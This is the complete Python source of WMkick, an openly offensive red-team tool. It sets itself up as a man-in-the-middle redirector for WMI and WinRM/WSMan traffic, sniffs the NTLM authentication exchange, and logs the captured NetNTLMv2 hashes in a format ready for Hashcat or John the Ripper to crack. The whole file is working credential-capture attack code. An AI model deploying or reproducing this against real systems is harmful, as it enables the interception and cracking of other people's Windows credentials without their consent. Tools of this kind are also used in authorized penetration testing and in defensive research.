#!/usr/bin/env python3
"""
Copyright 2020-2021 The WMkick Project, All Rights Reserved.

This software, having been partly or wholly developed and/or
sponsored by KoreLogic, Inc., is hereby released under the terms
and conditions set forth in the project's "README.LICENSE" file.
For a list of all contributors and sponsors, please refer to the
project's "README.CREDITS" file.
"""

__description__ = """
WMkick is a TCP protocol redirector/MITM tool that targets
NTLM authentication message flows in WMI (135/tcp) and
Powershell-Remoting/WSMan/WinRM (5985/tcp) to capture NetNTLMv2
hashes. Once a hash has been captured, popular cracking tools such as
Hashcat and JtR can be used to recover plaintext passwords. WMkick
automates the hash extraction process and alleviates the need to
build/use a WMI (or WSMAN) Authentication Server or perform manual
packet analysis.
"""

from base64 import b64decode
from codecs import encode
from collections import defaultdict, OrderedDict
from errno import ECONNRESET
from signal import signal, SIGINT
from ipaddress import IPv4Address, AddressValueError
from logging import addLevelName, Filter, getLogger, StreamHandler
from os import geteuid
from re import compile as re_compile, DOTALL
from socket import AF_INET, SHUT_RDWR, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR
from socket import error as sock_error, gaierror, getfqdn, gethostbyname, socket
from struct import unpack
from sys import stderr, stdout
from threading import Thread

from coloredlogs import ColoredFormatter
from scapy.all import sniff

from wmkick_lib import get_release_string_pep440

try:
    from kargparse.parser import KArgumentParser as ArgumentParser
except ImportError:
    from argparse import ArgumentParser

BANNER = r"""
  ___        ______  ___ _    _      _
  \  \      /  /   \/   | | _(_) ___| | __
   \  \ /\ /  /|  |  |  | |/ / |/ __| |/ /
    \  V  V  / |  |\/|  |   <| | (__|   <
     \__/\__/  |__|  |__|_|\_\_|\___|_|\_\
  Author: Houston Hunt, KoreLogic, Inc."""

MSG_TYPES = defaultdict(lambda: "UNKNOWN")
MSG_TYPES[1] = "Request"
MSG_TYPES[2] = "Challenge"
MSG_TYPES[3] = "Response"
HASH_LOG_LEVEL = 45
WMI_PORT = 135
WSMAN_HTTP_PORT = 5985
WSMAN_HTTPS_PORT = 5986

class NetNTLMv2Data:
    """
    Holds all information about a NetNTLMv2 Hash, which is built from
    elements of NTLMSSP negotiation messages.
    """
    def __init__(self, dport):
        if dport == WMI_PORT:
            self.tcp_protocol = "WMI"
        elif dport == WSMAN_HTTP_PORT:
            self.tcp_protocol = "WSMAN_HTTP"
        else:
            self.tcp_protocol = None
        self.username = None
        self.domain = None
        self.server_challenge = None
        self.ntlm_blob_hmac = None
        self.ntlm_blob = None
        self.logger = getLogger(__name__)

    def log_complete(self):
        """
        Return true if all elements necessary to build a NetNTLMv2 hash
        exist.
        """
        ntlm_hash_components = dict(vars(self).items())
        if None in ntlm_hash_components.values():
            return False

        self.logger.log(HASH_LOG_LEVEL, "%s Found:\n%s::%s:%s:%s:%s",
                        self.tcp_protocol,
                        self.username,
                        self.domain,
                        self.server_challenge,
                        self.ntlm_blob_hmac,
                        self.ntlm_blob)
        return True


class RedirectionHandler(Thread):
    """
    Redirects a monitored protocol to the target Windows host.
    """
    def __init__(self,
                 group=None,
                 target=None,
                 name=None,
                 args=(),
                 kwargs=None,
                 daemon=None,
                 listen_ip=None,
                 listen_port=None,
                 target_ip=None,
                 target_port=None,
                 max_connections=16,
                 logger=None):

        super().__init__(group=group,
                         target=target,
                         name=name,
                         args=args,
                         kwargs=kwargs,
                         daemon=daemon)
        self.src_ip = listen_ip
        self.src_port = listen_port
        self.dst_ip = target_ip
        self.dst_port = target_port
        self.max_connections = max_connections
        if logger is None:
            self.logger = getLogger(__name__)
        else:
            self.logger = logger
        self.server_socket = socket(AF_INET, SOCK_STREAM)
        self.server_socket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        try:
            self.server_socket.bind((listen_ip, listen_port))
            self.server_socket.listen(self.max_connections)
        except OSError as oserr:
            self.logger.error("Check listening ip/port: %s", oserr)
            exit(3)

    def run(self):
        self.server(self.src_ip, self.src_port, self.dst_ip, self.dst_port)

    def server(self, local_host, local_port, remote_host, remote_port):
        """Creates redirection server sockets."""
        self.logger.info('Redirecting traffic from [%s:%d] to [%s:%d]',
                         local_host,
                         local_port,
                         remote_host,
                         remote_port)
        while True:
            victim_socket, victim_address = self.server_socket.accept()
            self.logger.info("Connection from [%s:%s], attempt REMOTE server [%s:%d]",
                             victim_address[0],
                             victim_address[1],
                             remote_host,
                             remote_port)
            connection_thread = Thread(target=self.connect_target, args=(remote_host, remote_port, victim_socket))
            connection_thread.setDaemon(True)
            connection_thread.start()

    def connect_target(self, remote_host, remote_port, victim_socket):
        """
        After accepting a connection, create thread to this method to
        avoid blocking while connecting to target.
        """
        remote_socket = socket(AF_INET, SOCK_STREAM)
        try:
            remote_socket.connect((remote_host, remote_port))
            svr_soc_thread = Thread(target=self.transfer, args=(remote_socket, victim_socket, False))
            rem_soc_thread = Thread(target=self.transfer, args=(victim_socket, remote_socket, True))
            svr_soc_thread.setDaemon(True)
            rem_soc_thread.setDaemon(True)
            rem_soc_thread.start()
            svr_soc_thread.start()
        except sock_error as exception:
            remote_socket.close()
            victim_socket.close()
            self.logger.error("Exception caught as socket.error : %s", exception)

    def transfer(self, src, dst, direction_is_outbound):
        """
        Transfers data from redirector/listening host to target
        Windows host.
        """
        try:
            src_address = src.getsockname()[0]
            victim_address, victim_port = src.getpeername()
            win_host_address, win_host_port = dst.getpeername()
        except OSError as oserr:
            self.logger.error("Exception caught : %s", oserr)

        while True:
            try:
                buffer = src.recv(0x1000)
                if len(buffer) == 0: # pylint: disable=C1801
                    break
                if direction_is_outbound:
                    self.logger.debug("%s:%d --- %s --> %s:%d [buff: %d]",
                                      victim_address,
                                      victim_port,
                                      src_address,
                                      win_host_address,
                                      win_host_port,
                                      len(buffer))
                else:
                    self.logger.debug("%s:%d <-- %s --- %s:%d [buff: %d]",
                                      win_host_address,
                                      win_host_port,
                                      src_address,
                                      victim_address,
                                      victim_port,
                                      len(buffer))
                try:
                    dst.send(buffer)
                except IOError:
                    pass

            # Pass over connection reset errors.
            except sock_error as err:
                if err.errno != ECONNRESET:
                    self.logger.error("Exception caught : %s", err)
                    break

        try:
            if src.fileno() != -1:
                src.shutdown(SHUT_RDWR)
                src.close()
            if dst.fileno() != -1:
                dst.shutdown(SHUT_RDWR)
                dst.close()
        except OSError as err:
            if err.errno != 107:
                raise


class NTLMHandler(Thread):
    """
    Captures traffic matching the selected protocols on the victim
    and redirector sides, and asynchronously checks for NTLMSSP
    message traffic. If found, it stores information in a dictionary
    where they key is the ephemeral port and the NetNTLMv2Data
    object is the value. Once the final NTLM Authenticate message
    is observed, verifies that all required elements are available
    to construct and log the hash.
    """
    def __init__(self,
                 group=None,
                 target=None,
                 name=None,
                 args=(),
                 kwargs=None,
                 daemon=None,
                 listen_ip=None,
                 listen_port=None,
                 target_ip=None,
                 logger=None):

        super().__init__(group=group,
                         target=target,
                         name=name,
                         args=args,
                         kwargs=kwargs,
                         daemon=daemon)
        self.listen_ip = listen_ip
        self.listen_port = listen_port
        self.target_ip = target_ip
        self.tracker = {} # Use dynamic port as a key to track NetNTLMv2Data objects.
        if logger is None:
            self.logger = getLogger(__name__)
        else:
            self.logger = logger

    def search_ntlm(self, packet):
        """
        Check for NTLMSSP within packet based on TCP protocol found and
        store the required hash information based on the step in the
        NTLM authentication call flow.
        """
        dport = packet.getlayer("TCP").dport
        sport = packet.getlayer("TCP").sport
        ntlm_data = None
        if WMI_PORT in (dport, sport):
            if bytes(packet).find(b"NTLMSSP") > 0:
                pattern = re_compile(b"NTLMSSP(.*)", DOTALL)
                try:
                    ntlm_data = pattern.search(bytes(packet)).group()
                except AttributeError:
                    return
            else:
                return

        elif WSMAN_HTTP_PORT in (dport, sport):
            if bytes(packet).find(b"Negotiate") > 0:
                pattern = re_compile(b"Negotiate (.*?)\r\n")
                try:
                    base64encodeddata = pattern.search(bytes(packet)).group(1)
                    ntlm_data = b64decode(base64encodeddata)
                except AttributeError:
                    return
                except Exception as err:
                    self.logger.error(err)
                    return
            else:
                return

        else:
            return

        msg_type = unpack("<i", ntlm_data[8:12])[0]

        self.logger.debug("Msg Type: %d (%s)", msg_type, MSG_TYPES[msg_type])

        if msg_type == 1:
            # Track NetNTLMv2 Data via dynamic TCP port.
            self.tracker[sport] = NetNTLMv2Data(dport)
        elif msg_type == 2:
            # Track the challenge in NetNTLMv2 Data object.
            chall = format(unpack(">Q", ntlm_data[24:32])[0], 'x')
            self.tracker[packet.getlayer("TCP").dport].server_challenge = chall
        elif msg_type == 3:
            # This is the Authenticate Message.
            # Start after what we know, which is Signature (8b) and Message Type (4b).
            # Extract what we need.
            ntlm_tup = unpack("hhihhihhihhihhiqiq", ntlm_data[12:76])

            # Find the domain.
            domain_len = ntlm_tup[6]
            domain_offset = ntlm_tup[8]
            domain = ntlm_data[domain_offset:domain_offset+domain_len].decode('utf-16')
            # Find the username.
            user_len = ntlm_tup[9]
            user_offset = ntlm_tup[11]
            username = ntlm_data[user_offset:user_offset+user_len].decode('utf-16')
            # Find the challenge/response.
            resp_len = ntlm_tup[3]
            resp_offset = ntlm_tup[5]
            ntchallenge = ntlm_data[resp_offset:resp_offset+resp_len]
            ntlm_blob_hmac = encode(ntchallenge, 'hex_codec')[:32].decode('ascii')
            ntlm_blob = encode(ntchallenge, 'hex_codec')[32:].decode("ascii")

            # Save information in the tracker dictionary.
            sport = packet.getlayer("TCP").sport
            self.tracker[sport].domain = domain
            self.tracker[sport].username = username
            self.tracker[sport].ntlm_blob_hmac = ntlm_blob_hmac
            self.tracker[sport].ntlm_blob = ntlm_blob

            # Check to see of all required elements have been acquired. If
            # yes, build and log the corresponding NetNTLMv2 hash.
            if self.tracker[sport].log_complete():
                del self.tracker[sport]

        else:
            self.logger.debug("Unknown message structure. Here is a hex-dump:")
            self.logger.debug(ntlm_data.encode("hex"))

    def run(self):
        self.logger.info("Sniffer starting on %s port %s", self.listen_ip, self.listen_port)
        # Creates a Berkley Packet Filter to observe NTLM Authentication flow
        # request, challenge, and response messages, keeping track of them via
        # dynamic tcp port.  Currently configured to only observe traffic between
        # victim and redirector.
        filteropt = (
            '(ip dst host %s and dst port %s) or (ip src host %s and src port %s) and (not host %s)'
            % (self.listen_ip, self.listen_port, self.listen_ip, self.listen_port, self.target_ip)
        )

        sniff(filter=filteropt, prn=self.search_ntlm)


def catch_sigint(signal_number, stack_frame): # pylint: disable=W0613
    """
    Handle interrupt (i.e., SIGINT) signals received from the keyboard
    (e.g., 'CTRL+C') or other processes (e.g., 'kill -INT <pid>').
    """
    print()
    getLogger(__name__).warning("Caught a SIGINT signal. Exiting...")
    exit(0)

def create_thread_pair(threads, listen_ip, target_ip, protocol):
    """
    Create a pair of threads: one for redirection and one for monitoring.
    """
    ports = {'wmi': WMI_PORT, 'wsman-http': WSMAN_HTTP_PORT, 'wsman-https': WSMAN_HTTPS_PORT}
    name = protocol
    logger = getLogger(__name__)
    threads[name] = RedirectionHandler(name=name,
                                       daemon=True,
                                       listen_ip=listen_ip,
                                       listen_port=ports[protocol],
                                       target_ip=target_ip,
                                       target_port=ports[protocol],
                                       logger=logger)
    name = name + '-sniffer'
    threads[name] = NTLMHandler(name=name,
                                daemon=True,
                                listen_ip=listen_ip,
                                listen_port=ports[protocol],
                                target_ip=target_ip,
                                logger=logger)

def setup_logging(log_level):
    """
    Defines the styling for a custom set of log levels, configures
    console logging for stderr and stdout, and returns a reference
    to the modified logger.
    """

    # Define styling for a custom set of log levels.
    level_styles = {'critical': {'bold': True, 'color': 'red'},
                    'debug': {'color': 'blue'},
                    'error': {'color': 'red'},
                    'info': {},
                    'notice': {'color': 'magenta'},
                    'spam': {'color': 'green', 'faint': True},
                    'success': {'bold': True, 'color': 'green'},
                    'verbose': {'color': 'blue'},
                    'warning': {'color': 'yellow'},
                    'hash': {'bold':True, 'color':'green'}}
    addLevelName(HASH_LOG_LEVEL, "HASH")
    logger_setup = getLogger(__name__)
    logger_setup.setLevel(log_level)

    # Configure console logging for stderr and stdout. Everything except
    # HASH_LOG_LEVEL is logged to stderr.
    stdout_handler = StreamHandler(stdout)
    stdout_handler.setLevel(45)
    stdout_handler.addFilter(
        type('', (Filter,), {'filter': staticmethod(lambda r: r.levelno == HASH_LOG_LEVEL)})
        )
    stdout_handler.setFormatter(
        ColoredFormatter(fmt='%(levelname)s %(asctime)s %(message)s', level_styles=level_styles)
        )
    stderr_handler = StreamHandler(stderr)
    stderr_handler.setLevel(10)
    stderr_handler.addFilter(
        type('', (Filter,), {'filter': staticmethod(lambda r: r.levelno is not HASH_LOG_LEVEL)})
        )
    stderr_handler.setFormatter(
        ColoredFormatter(fmt='%(levelname)s %(asctime)s %(message)s', level_styles=level_styles)
        )
    logger_setup.addHandler(stdout_handler)
    logger_setup.addHandler(stderr_handler)

    # Return a reference to the modified logger.
    return logger_setup


def main():
    """Program entry point if called as an executable."""

    log_levels = OrderedDict({'critical':50, 'error':40, 'warning':30, 'info':20, 'debug':10})

    parser = ArgumentParser(description=__description__)
    parser.add_argument('-L', '--log-level',
                        choices=list(log_levels),
                        default='info',
                        help="""
                             Set the level of detail logged to the screen. Valid choices include:
                             %(choices)s. Note that these choices are ordered from left to right
                             according to the amount of information/detail (i.e., least to most)
                             they provide. The default value is '%(default)s'.
                             """,
                        metavar='level')
    parser.add_argument('-l', '--listen-host',
                        default=None,
                        help="""
                             IPv4 address that will receive/monitor incoming requests. The default
                             value is the IPv4 address translated from the local hostname.
                             """,
                        metavar='listen-host')
    parser.add_argument('-p', "--protocol",
                        action='append',
                        choices=['all', 'any', 'wmi', 'wsman-http', 'wsman-https'],
                        default=None,
                        dest='protocols',
                        help="""
                             Specify a protocol to monitor. This option may be specified multiple
                             times. Valid choices include: %(choices)s. The default value is 'all',
                             which means monitor WMI (tcp/135), WSMan HTTP (tcp/5985), and WSMan
                             HTTPS (tcp/5986) simulataneously. Note that support for WSMan HTTPS
                             is not yet implemented.
                             """)
    parser.add_argument('target_ip',
                        help="""
                             IPv4 address of Windows target where the WMI/WSMAN server is hosted.
                             """,
                        metavar='target-ip')
    parser.add_argument('-v', '--version',
                        action='version',
                        help="""
                             Show version number and exit.
                             """,
                        version=get_release_string_pep440())
    args = parser.parse_args()

    logger = setup_logging(log_levels.get(args.log_level))

    print(BANNER)
    print('  Version: {}'.format(get_release_string_pep440()))
    print("  Press ctrl+c to kill this script.\n")

    if args.listen_host is None:
        try:
            listen_ip = gethostbyname(getfqdn())
        except gaierror:
            logger.error("Could not determine primary IPv4 address. \
                          Please specify one with '--listen-host'.")
            exit(2)
    else:
        listen_ip = args.listen_host

    target_ip = args.target_ip
    for candidate in [listen_ip, target_ip]:
        try:
            IPv4Address(candidate)
        except AddressValueError:
            logger.error("IPv4 address argument \"%s\" is not valid. Please specify a valid one.", candidate)
            exit(2)

    if geteuid() != 0:
        logger.error("This program must run with root privileges.")
        exit(2)

    signal(SIGINT, catch_sigint)

    if args.protocols is None:
        args.protocols = ['all']
    protocols = sorted(set(args.protocols))
    if 'any' in protocols or 'all' in protocols:
        protocols = ['wmi', 'wsman-http']

    threads = {}
    for protocol in protocols:
        if protocol == 'wsman-https':
            logger.warning("Protocol \"%s\" not yet implemented. Skipping...", protocol)
            continue
        create_thread_pair(threads, listen_ip, target_ip, protocol)

    for name in sorted(threads.keys()):
        threads[name].start()

    for name in sorted(threads.keys()):
        threads[name].join()

    exit(0)

if __name__ == '__main__':
    main()
